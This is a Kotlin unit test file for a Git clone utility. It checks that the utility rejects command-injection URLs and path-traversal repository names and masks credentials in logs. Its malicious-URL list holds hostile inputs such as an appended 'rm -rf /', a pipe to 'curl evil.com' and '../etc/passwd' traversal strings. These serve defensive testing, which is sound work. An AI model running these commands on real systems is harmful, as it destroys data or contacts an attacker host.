package com.songwh.bosprojectinit.utils

import kotlinx.coroutines.runBlocking
import java.io.File
import java.nio.file.Files
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * GitUtils 安全功能单元测试
 * 测试命令注入防护、路径穿越防护、URL 脱敏等安全特性
 */
class GitUtilsTest {

    private val gitUtils = GitUtils(AtomicBoolean(false))

    // ============ URL 格式验证测试 ============

    @Test
    fun testShouldAcceptValidHttpsUrls() = runBlocking {
        val validUrls = listOf(
            "https://github.com/user/repo.git",
            "https://gitlab.com/group/project.git",
            "https://bitbucket.org/team/repository.git",
            "https://github.com:443/user/repo.git",
            "https://internal-git.company.com/project.git"
        )

        validUrls.forEach { url ->
            val tempDir = Files.createTempDirectory("test").toFile()
            try {
                val repoName = gitUtils.extractRepoName(url)
                val result = gitUtils.cloneRepository(url, repoName, tempDir, { _, _ -> })
                // URL 应该通过格式验证（即使克隆失败，也不应该是 INVALID_URL 错误）
                assertTrue(
                    result.errorType != GitErrorType.INVALID_URL,
                    "有效的 URL 不应被拒绝: $url"
                )
            } finally {
                tempDir.deleteRecursively()
            }
        }
    }

    @Test
    fun testShouldAcceptValidSshUrls() = runBlocking {
        val validUrls = listOf(
            "git@github.com:user/repo.git",
            "git@gitlab.com:group/project.git"
        )

        validUrls.forEach { url ->
            val tempDir = Files.createTempDirectory("test").toFile()
            try {
                val repoName = gitUtils.extractRepoName(url)
                val result = gitUtils.cloneRepository(url, repoName, tempDir, { _, _ -> })
                assertTrue(
                    result.errorType != GitErrorType.INVALID_URL,
                    "有效的 SSH URL 不应被拒绝: $url"
                )
            } finally {
                tempDir.deleteRecursively()
            }
        }
    }

    @Test
    fun testShouldRejectMaliciousUrlsWithCommandInjection() = runBlocking {
        val maliciousUrls = listOf(
            "https://github.com/user/repo.git; rm -rf /",
            "https://github.com/user/repo.git && malicious-command",
            "https://github.com/user/repo.git | curl evil.com",
            "https://github.com/user/repo.git`whoami`",
            "https://github.com/user/repo.git\$(ls)",
            "https://github.com/user/repo.git;ls"
        )

        maliciousUrls.forEach { url ->
            val tempDir = Files.createTempDirectory("test").toFile()
            try {
                val result = gitUtils.cloneRepository(url, "test-repo", tempDir, { _, _ -> })
                assertEquals(
                    GitErrorType.INVALID_URL,
                    result.errorType,
                    "应拒绝恶意 URL: $url"
                )
                assertFalse(result.success, "克隆应失败")
                assertTrue(result.errorMessage.contains("无效的 Git URL"), "应包含错误说明")
            } finally {
                tempDir.deleteRecursively()
            }
        }
    }

    @Test
    fun testShouldRejectInvalidUrlFormats() = runBlocking {
        val invalidUrls = listOf(
            "not-a-url",
            "ftp://github.com/user/repo.git",  // 不支持的协议
            "file:///local/path",
            "javascript:alert(1)",
            ""
        )

        invalidUrls.forEach { url ->
            val tempDir = Files.createTempDirectory("test").toFile()
            try {
                val result = gitUtils.cloneRepository(url, "test-repo", tempDir, { _, _ -> })
                assertEquals(
                    GitErrorType.INVALID_URL,
                    result.errorType,
                    "应拒绝无效 URL: $url"
                )
            } finally {
                tempDir.deleteRecursively()
            }
        }
    }

    // ============ 仓库名验证测试 ============

    @Test
    fun testShouldExtractValidRepositoryNames() {
        val testCases = mapOf(
            "https://github.com/user/my-repo.git" to "my-repo",
            "https://github.com/user/project_name.git" to "project_name",
            "git@github.com:user/test-123.git" to "test-123",
            "https://github.com/user/UPPERCASE.git" to "UPPERCASE"
        )

        testCases.forEach { (url, expectedName) ->
            val actualName = gitUtils.extractRepoName(url)
            assertEquals(expectedName, actualName, "仓库名提取错误: $url")
        }
    }

    @Test
    fun testShouldFilterDangerousCharactersInRepoNames() {
        val testCases = mapOf(
            "https://github.com/user/repo@special.git" to "repo_special",
            "https://github.com/user/repo#hash.git" to "repo_hash",
            "https://github.com/user/repo space.git" to "repo_space",
            "https://github.com/user/repo%20name.git" to "repo_20name"
        )

        testCases.forEach { (url, expectedSanitized) ->
            val actualName = gitUtils.extractRepoName(url)
            assertEquals(expectedSanitized, actualName, "危险字符应被过滤: $url")
        }
    }

    @Test
    fun testShouldRejectRepoNamesWithPathTraversal() {
        val maliciousUrls = listOf(
            "https://github.com/user/../../../etc/passwd.git",
            "https://github.com/user/..%2F..%2Fetc%2Fpasswd.git",
            "https://github.com/user/.git",
            "https://github.com/user/...git"
        )

        maliciousUrls.forEach { url ->
            try {
                gitUtils.extractRepoName(url)
                throw AssertionError("应抛出异常拒绝路径穿越: $url")
            } catch (e: IllegalArgumentException) {
                assertTrue(e.message?.contains("无效的仓库名称") == true)
            }
        }
    }

    @Test
    fun testShouldRejectInvalidRepoNameFormats() = runBlocking {
        val invalidRepoNames = listOf(
            "../malicious",
            ".hidden-repo",
            "repo/../escape",
            "a".repeat(300)  // 过长的名称
        )

        invalidRepoNames.forEach { repoName ->
            val tempDir = Files.createTempDirectory("test").toFile()
            try {
                val result = gitUtils.cloneRepository(
                    "https://github.com/user/test.git",
                    repoName,
                    tempDir,
                    { _, _ -> }
                )
                assertEquals(
                    GitErrorType.INVALID_REPO_NAME,
                    result.errorType,
                    "应拒绝无效仓库名: $repoName"
                )
            } finally {
                tempDir.deleteRecursively()
            }
        }
    }

    // ============ 路径穿越防护测试 ============

    @Test
    fun testShouldDetectAndBlockPathTraversalAttacks() = runBlocking {
        val tempRoot = Files.createTempDirectory("root").toFile()
        try {
            // 尝试使用路径穿越的仓库名
            val result = gitUtils.cloneRepository(
                "https://github.com/user/test.git",
                "../escape",  // 尝试逃逸到父目录
                tempRoot,
                { _, _ -> }
            )

            assertEquals(
                GitErrorType.INVALID_REPO_NAME,
                result.errorType,
                "应检测到路径穿越"
            )
            assertFalse(result.success)
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    @Test
    fun testShouldVerifyTargetDirectoryWithinRoot() = runBlocking {
        val tempRoot = Files.createTempDirectory("root").toFile()
        try {
            // 使用正常仓库名，验证 canonicalFile 检查
            val result = gitUtils.cloneRepository(
                "https://github.com/user/valid-repo.git",
                "valid-repo",
                tempRoot,
                { _, _ -> }
            )

            // 应该通过路径验证（即使克隆失败，也不应是 PATH_TRAVERSAL 错误）
            assertTrue(
                result.errorType != GitErrorType.PATH_TRAVERSAL,
                "正常仓库名不应触发路径穿越检测"
            )
        } finally {
            tempRoot.deleteRecursively()
        }
    }

    // ============ URL 脱敏测试 ============

    @Test
    fun testShouldSanitizeCredentialsInHttpsUrls() {
        val testCases = mapOf(
            "https://user:password@github.com/repo.git" to "https://***@github.com/repo.git",
            "https://token:x-oauth-basic@github.com/repo.git" to "https://***@github.com/repo.git",
            "https://github.com/repo.git" to "https://github.com/repo.git",  // 无凭证
            "https://user@github.com/repo.git" to "https://***@github.com/repo.git"
        )

        testCases.forEach { (original, expected) ->
            val sanitized = gitUtils.sanitizeUrl(original)
            assertEquals(expected, sanitized, "URL 脱敏错误")
        }
    }

    @Test
    fun testShouldSanitizeUserInfoInSshUrls() {
        val testCases = mapOf(
            "git@github.com:user/repo.git" to "git@github.com:***/repo.git",
            "git@gitlab.com:group/project.git" to "git@gitlab.com:***/project.git"
        )

        testCases.forEach { (original, expected) ->
            val sanitized = gitUtils.sanitizeUrl(original)
            assertEquals(expected, sanitized, "SSH URL 脱敏错误")
        }
    }

    // ============ 错误信息详细性测试 ============

    @Test
    fun testShouldProvideDetailedErrorMessagesByExitCode() = runBlocking {
        val tempDir = Files.createTempDirectory("test").toFile()
        try {
            // 使用不存在的仓库测试错误信息
            val result = gitUtils.cloneRepository(
                "https://github.com/nonexistent-user-12345/nonexistent-repo-67890.git",
                "test-repo",
                tempDir,
                { _, _ -> }
            )

            assertFalse(result.success)
            assertTrue(
                result.errorMessage.isNotEmpty(),
                "应包含详细错误信息"
            )
            // 错误信息应该是分类的
            assertTrue(
                result.errorType != GitErrorType.UNKNOWN || result.errorMessage.contains("Git"),
                "应包含有意义的错误描述"
            )
        } finally {
            tempDir.deleteRecursively()
        }
    }

    // ============ 进程管理测试 ============

    @Test
    fun testShouldHandleCancellationCorrectly() = runBlocking {
        val cancelled = AtomicBoolean(false)
        val cancelableGitUtils = GitUtils(cancelled)
        val tempDir = Files.createTempDirectory("test").toFile()

        try {
            // 立即取消
            cancelled.set(true)
            cancelableGitUtils.cancel()

            val result = cancelableGitUtils.cloneRepository(
                "https://github.com/user/repo.git",
                "test-repo",
                tempDir,
                { _, _ -> }
            )

            // 取消后的克隆应该快速失败
            assertFalse(result.success)
        } finally {
            tempDir.deleteRecursively()
        }
    }

    // ============ 边界情况测试 ============

    @Test
    fun testShouldHandleEmptyRepositoryName() {
        try {
            gitUtils.extractRepoName("https://github.com/user/.git")
            throw AssertionError("应拒绝空仓库名")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message?.contains("无效的仓库名称") == true)
        }
    }

    @Test
    fun testShouldHandleVeryLongUrls() = runBlocking {
        val longUrl = "https://github.com/" + "a".repeat(500) + "/repo.git"
        val tempDir = Files.createTempDirectory("test").toFile()
        try {
            val result = gitUtils.cloneRepository(longUrl, "test-repo", tempDir, { _, _ -> })
            // 应该优雅处理，不应崩溃
            assertFalse(result.success)
        } finally {
            tempDir.deleteRecursively()
        }
    }

    @Test
    fun testShouldHandlePathsWithSpecialCharacters() = runBlocking {
        val tempRoot = Files.createTempDirectory("测试-目录").toFile()
        try {
            val result = gitUtils.cloneRepository(
                "https://github.com/user/test.git",
                "test-repo",
                tempRoot,
                { _, _ -> }
            )
            // 应该优雅处理非 ASCII 字符的路径
            assertTrue(result.errorType != GitErrorType.PATH_TRAVERSAL)
        } finally {
            tempRoot.deleteRecursively()
        }
    }
}